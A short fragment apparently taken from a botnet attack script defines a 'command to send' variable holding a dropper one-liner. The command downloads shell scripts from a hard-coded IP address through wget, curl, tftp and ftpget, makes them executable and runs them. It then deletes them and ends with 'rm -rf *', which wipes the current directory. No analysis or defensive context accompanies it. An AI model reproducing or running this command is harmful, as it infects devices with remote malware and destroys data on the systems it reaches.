...
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.127.224.48/8UsA.sh; curl -O http://188.127.224.48/8UsA.sh; chmod 777 8UsA.sh;sh 8UsA.sh; tftp 188.127.224.48 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh;tftp -r t8UsA2.sh -g 188.127.224.48; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.127.224.48 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh;rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *" #command to send
